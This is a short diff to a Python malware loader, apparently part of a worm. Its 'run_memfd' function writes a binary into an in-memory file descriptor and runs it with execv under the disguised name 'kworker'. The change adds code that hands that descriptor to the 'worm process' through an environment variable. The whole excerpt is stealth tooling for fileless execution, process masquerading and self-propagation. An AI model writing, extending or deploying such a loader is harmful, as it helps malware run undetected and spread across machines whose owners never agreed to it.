@@ -52,12 +52,18 @@ def run_memfd():
     # 4. Write Binary to RAM
     os.write(fd, binary_data)
     
-    # 5. Execute
+    # 5. Pass file descriptor to worm via environment variable
+    # The fd will be preserved across execv (standard Unix behavior)
+    os.environ['MEMFD_FD'] = str(fd)
+    print(f"[*] Passing memfd fd={fd} to worm process")
+    
+    # 6. Execute
     fd_path = f"/proc/self/fd/{fd}"
     print(f"[*] Executing from memfd: {fd_path}")
     try:
         # Replace current process with the binary
         # argv[0] = "kworker"
+        # The file descriptor will be inherited by the new process
         os.execv(fd_path, ["kworker"])
     except OSError as e:
         print(f"[-] Exec failed: {e.errno} - {e.strerror}")
